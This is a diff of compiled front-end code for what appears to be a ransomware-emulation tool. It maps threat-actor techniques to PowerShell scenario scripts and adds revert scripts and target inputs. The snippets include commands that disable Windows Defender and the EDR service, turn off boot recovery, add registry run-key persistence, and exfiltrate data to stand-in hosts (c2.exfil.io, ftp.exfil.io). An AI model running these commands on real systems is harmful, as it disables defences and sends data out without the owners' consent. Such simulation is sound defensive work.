@@ -278,7 +278,8 @@ const THREAT_ACTORS = [
                 tactic: 'Defense Evasion',
                 description: 'Modifies registry to disable Windows Defender defenses.',
                 commandSnippet: 'Set-MpPreference -DisableRealtimeMonitoring $true',
-                scriptPath: 'scenarios/lockbit/disable_defender.ps1'
+                scriptPath: 'scenarios/lockbit/disable_defender.ps1',
+                revertScriptPath: 'scenarios/lockbit/disable_defender_revert.ps1'
             },
             {
                 id: 'T1490',
@@ -286,7 +287,8 @@ const THREAT_ACTORS = [
                 tactic: 'Impact',
                 description: 'Disables boot recovery options using bcdedit.',
                 commandSnippet: 'bcdedit /set {default} recoveryenabled No',
-                scriptPath: 'scenarios/lockbit/bcdedit_recovery.ps1'
+                scriptPath: 'scenarios/lockbit/bcdedit_recovery.ps1',
+                revertScriptPath: 'scenarios/lockbit/bcdedit_recovery_revert.ps1'
             }
         ]
     },
@@ -355,7 +357,8 @@ const THREAT_ACTORS = [
                 tactic: 'Defense Evasion',
                 description: 'Uses Backstab tool to disable EDR products.',
                 commandSnippet: 'Stop-Service -Name "Sense" -Force',
-                scriptPath: 'scenarios/blackbasta/disable_edr.ps1'
+                scriptPath: 'scenarios/blackbasta/disable_edr.ps1',
+                revertScriptPath: 'scenarios/blackbasta/disable_edr_revert.ps1'
             },
             {
                 id: 'T1068',
@@ -371,7 +374,16 @@ const THREAT_ACTORS = [
                 tactic: 'Lateral Movement',
                 description: 'Uses valid accounts for RDP access.',
                 commandSnippet: 'mstsc /v:<TARGET_IP>',
-                scriptPath: 'scenarios/blackbasta/rdp_lateral.ps1'
+                scriptPath: 'scenarios/blackbasta/rdp_lateral.ps1',
+                inputParams: [
+                    {
+                        name: 'TargetIP',
+                        label: 'Target IP Address',
+                        type: 'ip',
+                        placeholder: '10.0.0.1',
+                        required: true
+                    }
+                ]
             }
         ]
     },
@@ -407,7 +419,8 @@ const THREAT_ACTORS = [
                 tactic: 'Execution',
                 description: 'Creates scheduled tasks to deploy ransomware via GPO.',
                 commandSnippet: 'schtasks /create /sc once /tn "Update" /tr "C:\\payload.exe" /st 00:00',
-                scriptPath: 'scenarios/alphv/schtask_create.ps1'
+                scriptPath: 'scenarios/alphv/schtask_create.ps1',
+                revertScriptPath: 'scenarios/alphv/schtask_create_revert.ps1'
             }
         ]
     },
@@ -442,7 +455,16 @@ const THREAT_ACTORS = [
                 tactic: 'Command and Control',
                 description: 'Uses tools like AnyDesk or TeamViewer for persistence.',
                 commandSnippet: 'Start-Process "C:\\AnyDesk\\AnyDesk.exe" -ArgumentList "--start-service"',
-                scriptPath: 'scenarios/avoslocker/rat_install.ps1'
+                scriptPath: 'scenarios/avoslocker/rat_install.ps1',
+                inputParams: [
+                    {
+                        name: 'C2URL',
+                        label: 'C2 Server URL',
+                        type: 'url',
+                        placeholder: 'http://10.0.0.1:443/beacon',
+                        required: true
+                    }
+                ]
             },
             {
                 id: 'T1486',
@@ -492,7 +514,8 @@ const THREAT_ACTORS = [
                 tactic: 'Impact',
                 description: 'Encrypts data for extortion.',
                 commandSnippet: '# Encryption simulation (safe mode)',
-                scriptPath: 'scenarios/bianlian/encrypt_sim.ps1'
+                scriptPath: 'scenarios/bianlian/encrypt_sim.ps1',
+                revertScriptPath: 'scenarios/bianlian/encrypt_sim_revert.ps1'
             }
         ]
     },
@@ -520,7 +543,8 @@ const THREAT_ACTORS = [
                 tactic: 'Persistence',
                 description: 'Creates registry run entries for persistence.',
                 commandSnippet: 'Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Update" -Value "C:\\payload.exe"',
-                scriptPath: 'scenarios/clop/registry_persist.ps1'
+                scriptPath: 'scenarios/clop/registry_persist.ps1',
+                revertScriptPath: 'scenarios/clop/registry_persist_revert.ps1'
             },
             {
                 id: 'T1070.001',
@@ -563,7 +587,16 @@ const THREAT_ACTORS = [
                 tactic: 'Exfiltration',
                 description: 'Exfiltrates data before encryption for double extortion.',
                 commandSnippet: 'Invoke-WebRequest -Uri "https://c2.exfil.io/upload" -Method POST',
-                scriptPath: 'scenarios/conti/exfil_web.ps1'
+                scriptPath: 'scenarios/conti/exfil_web.ps1',
+                inputParams: [
+                    {
+                        name: 'ExfilURL',
+                        label: 'Exfiltration URL',
+                        type: 'url',
+                        placeholder: 'http://10.0.0.1:8080/upload',
+                        required: true
+                    }
+                ]
             }
         ]
     },
@@ -581,7 +614,8 @@ const THREAT_ACTORS = [
                 tactic: 'Defense Evasion',
                 description: 'Disables Windows Defender before encryption.',
                 commandSnippet: 'Set-MpPreference -DisableRealtimeMonitoring $true',
-                scriptPath: 'scenarios/dragonforce/disable_defender.ps1'
+                scriptPath: 'scenarios/dragonforce/disable_defender.ps1',
+                revertScriptPath: 'scenarios/dragonforce/disable_defender_revert.ps1'
             },
             {
                 id: 'T1070.004',
@@ -615,7 +649,16 @@ const THREAT_ACTORS = [
                 tactic: 'Initial Access',
                 description: 'Gains access via exposed RDP services.',
                 commandSnippet: 'Test-NetConnection -ComputerName <TARGET> -Port 3389',
-                scriptPath: 'scenarios/safepay/rdp_scan.ps1'
+                scriptPath: 'scenarios/safepay/rdp_scan.ps1',
+                inputParams: [
+                    {
+                        name: 'TargetIP',
+                        label: 'Target IP or Subnet',
+                        type: 'subnet',
+                        placeholder: '10.0.0.0/24',
+                        required: true
+                    }
+                ]
             },
             {
                 id: 'T1548.002',
@@ -623,7 +666,8 @@ const THREAT_ACTORS = [
                 tactic: 'Privilege Escalation',
                 description: 'Bypasses UAC using CMSTPLUA COM object.',
                 commandSnippet: '# UAC bypass via CMSTPLUA simulation',
-                scriptPath: 'scenarios/safepay/uac_bypass.ps1'
+                scriptPath: 'scenarios/safepay/uac_bypass.ps1',
+                revertScriptPath: 'scenarios/safepay/uac_bypass_revert.ps1'
             },
             {
                 id: 'T1003',
@@ -639,7 +683,16 @@ const THREAT_ACTORS = [
                 tactic: 'Exfiltration',
                 description: 'Uses FTP (FileZilla) for data exfiltration.',
                 commandSnippet: 'ftp -s:script.txt ftp.exfil.io',
-                scriptPath: 'scenarios/safepay/ftp_exfil.ps1'
+                scriptPath: 'scenarios/safepay/ftp_exfil.ps1',
+                inputParams: [
+                    {
+                        name: 'FTPServer',
+                        label: 'FTP Server IP',
+                        type: 'ip',
+                        placeholder: '10.0.0.1',
+                        required: true
+                    }
+                ]
             }
         ]
     }
@@ -677,38 +730,39 @@ var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$app$2f$page$2e$module
 function CampaignsPage() {
     return /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("main", {
         className: "container",
+        style: {
+            animation: 'fadeIn 0.3s ease'
+        },
         children: [
             /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("header", {
-                className: __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$app$2f$page$2e$module$2e$css__$5b$app$2d$client$5d$__$28$css__module$29$__["default"].header,
-                children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
-                    children: [
-                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("h1", {
-                            className: "mono glow-text",
-                            style: {
-                                fontSize: '2.5rem',
-                                marginBottom: '0.5rem'
-                            },
-                            children: "ADVERSARY CAMPAIGNS"
-                        }, void 0, false, {
-                            fileName: "[project]/src/app/campaigns/page.tsx",
-                            lineNumber: 12,
-                            columnNumber: 21
-                        }, this),
-                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
-                            className: "text-dim mono",
-                            children: "End-to-End Attack Simulations // Multi-Stage TTPs"
-                        }, void 0, false, {
-                            fileName: "[project]/src/app/campaigns/page.tsx",
-                            lineNumber: 15,
-                            columnNumber: 21
-                        }, this)
-                    ]
-                }, void 0, true, {
-                    fileName: "[project]/src/app/campaigns/page.tsx",
-                    lineNumber: 11,
-                    columnNumber: 17
-                }, this)
-            }, void 0, false, {
+                style: {
+                    marginBottom: '2rem',
+                    borderBottom: '1px solid #333',
+                    paddingBottom: '1rem'
+                },
+                children: [
+                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("h1", {
+                        className: "mono text-primary glow-text",
+                        style: {
+                            fontSize: '2.5rem',
+                            marginBottom: '0.5rem'
+                        },
+                        children: "ADVERSARY CAMPAIGNS"
+                    }, void 0, false, {
+                        fileName: "[project]/src/app/campaigns/page.tsx",
+                        lineNumber: 11,
+                        columnNumber: 17
+                    }, this),
+                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
+                        className: "text-dim mono",
+                        children: "End-to-End Attack Simulations // Multi-Stage TTPs"
+                    }, void 0, false, {
+                        fileName: "[project]/src/app/campaigns/page.tsx",
+                        lineNumber: 14,
+                        columnNumber: 17
+                    }, this)
+                ]
+            }, void 0, true, {
                 fileName: "[project]/src/app/campaigns/page.tsx",
                 lineNumber: 10,
                 columnNumber: 13
@@ -717,17 +771,22 @@ function CampaignsPage() {
                 className: __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$app$2f$page$2e$module$2e$css__$5b$app$2d$client$5d$__$28$css__module$29$__["default"].scenariosGrid,
                 children: __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$types$2e$ts__$5b$app$2d$client$5d$__$28$ecmascript$29$__["CAMPAIGNS"].map((campaign)=>/*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                         className: "card",
+                        style: {
+                            border: '1px solid #333'
+                        },
+                        onMouseEnter: (e)=>e.currentTarget.style.borderColor = 'var(--primary)',
+                        onMouseLeave: (e)=>e.currentTarget.style.borderColor = '#333',
                         children: [
                             /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                 style: {
                                     display: 'flex',
                                     justifyContent: 'space-between',
-                                    alignItems: 'start',
+                                    alignItems: 'center',
                                     marginBottom: '1rem'
                                 },
                                 children: [
                                     /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
-                                        className: `mono ${__TURBOPACK__imported__module__$5b$project$5d2f$src$2f$app$2f$page$2e$module$2e$css__$5b$app$2d$client$5d$__$28$css__module$29$__["default"].badge}`,
+                                        className: "badge",
                                         style: {
                                             color: 'var(--warning)',
                                             borderColor: 'var(--warning)'
@@ -739,7 +798,7 @@ function CampaignsPage() {
                                         columnNumber: 29
                                     }, this),
                                     /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
-                                        className: "text-dim mono",
+                                        className: "mono text-dim",
                                         style: {
                                             fontSize: '0.8rem'
                                         },
@@ -761,7 +820,7 @@ function CampaignsPage() {
                             /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("h2", {
                                 className: "mono text-primary",
                                 style: {
-                                    fontSize: '1.25rem',
+                                    fontSize: '1.2rem',
                                     marginBottom: '0.5rem'
                                 },
                                 children: campaign.name
@@ -775,11 +834,14 @@ function CampaignsPage() {
                                 style: {
                                     fontSize: '0.9rem',
                                     marginBottom: '1.5rem',
-                                    lineHeight: '1.6',
+                                    lineHeight: '1.5',
                                     minHeight: '3em'
                                 },
-                                children: campaign.description
-                            }, void 0, false, {
+                                children: [
+                                    campaign.description.substring(0, 100),
+                                    "..."
+                                ]
+                            }, void 0, true, {
                                 fileName: "[project]/src/app/campaigns/page.tsx",
                                 lineNumber: 32,
                                 columnNumber: 25
@@ -802,39 +864,61 @@ function CampaignsPage() {
                                         columnNumber: 29
                                     }, this),
                                     /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
-                                        className: "mono text-dim",
                                         style: {
-                                            fontSize: '0.8rem',
-                                            display: 'flex',
-                                            flexDirection: 'column',
+                                            display: 'grid',
                                             gap: '0.25rem'
                                         },
-                                        children: campaign.steps.map((step, i)=>/*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
+                                        children: [
+                                            campaign.steps.slice(0, 4).map((step, i)=>/*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
+                                                    className: "accent-item",
+                                                    style: {
+                                                        padding: '0.4rem 0.75rem',
+                                                        fontSize: '0.8rem'
+                                                    },
+                                                    children: [
+                                                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
+                                                            className: "text-primary mono",
+                                                            style: {
+                                                                marginRight: '0.5rem'
+                                                            },
+                                                            children: "↓"
+                                                        }, void 0, false, {
+                                                            fileName: "[project]/src/app/campaigns/page.tsx",
+                                                            lineNumber: 41,
+                                                            columnNumber: 41
+                                                        }, this),
+                                                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
+                                                            className: "mono text-dim",
+                                                            children: step
+                                                        }, void 0, false, {
+                                                            fileName: "[project]/src/app/campaigns/page.tsx",
+                                                            lineNumber: 42,
+                                                            columnNumber: 41
+                                                        }, this)
+                                                    ]
+                                                }, i, true, {
+                                                    fileName: "[project]/src/app/campaigns/page.tsx",
+                                                    lineNumber: 40,
+                                                    columnNumber: 37
+                                                }, this)),
+                                            campaign.steps.length > 4 && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
+                                                className: "mono text-dim",
                                                 style: {
-                                                    display: 'flex',
-                                                    alignItems: 'center',
-                                                    gap: '0.5rem'
+                                                    fontSize: '0.75rem',
+                                                    paddingLeft: '0.75rem'
                                                 },
                                                 children: [
-                                                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
-                                                        style: {
-                                                            color: 'var(--primary)'
-                                                        },
-                                                        children: "↓"
-                                                    }, void 0, false, {
-                                                        fileName: "[project]/src/app/campaigns/page.tsx",
-                                                        lineNumber: 41,
-                                                        columnNumber: 41
-                                                    }, this),
-                                                    " ",
-                                                    step
+                                                    "+",
+                                                    campaign.steps.length - 4,
+                                                    " more steps..."
                                                 ]
-                                            }, i, true, {
+                                            }, void 0, true, {
                                                 fileName: "[project]/src/app/campaigns/page.tsx",
-                                                lineNumber: 40,
+                                                lineNumber: 46,
                                                 columnNumber: 37
-                                            }, this))
-                                    }, void 0, false, {
+                                            }, this)
+                                        ]
+                                    }, void 0, true, {
                                         fileName: "[project]/src/app/campaigns/page.tsx",
                                         lineNumber: 38,
                                         columnNumber: 29
@@ -856,18 +940,18 @@ function CampaignsPage() {
                                 children: "INITIATE CAMPAIGN"
                             }, void 0, false, {
                                 fileName: "[project]/src/app/campaigns/page.tsx",
-                                lineNumber: 47,
+                                lineNumber: 53,
                                 columnNumber: 25
                             }, this)
                         ]
                     }, campaign.id, true, {
                         fileName: "[project]/src/app/campaigns/page.tsx",
-                        lineNumber: 23,
+                        lineNumber: 21,
                         columnNumber: 21
                     }, this))
             }, void 0, false, {
                 fileName: "[project]/src/app/campaigns/page.tsx",
-                lineNumber: 21,
+                lineNumber: 19,
                 columnNumber: 13
             }, this)
         ]
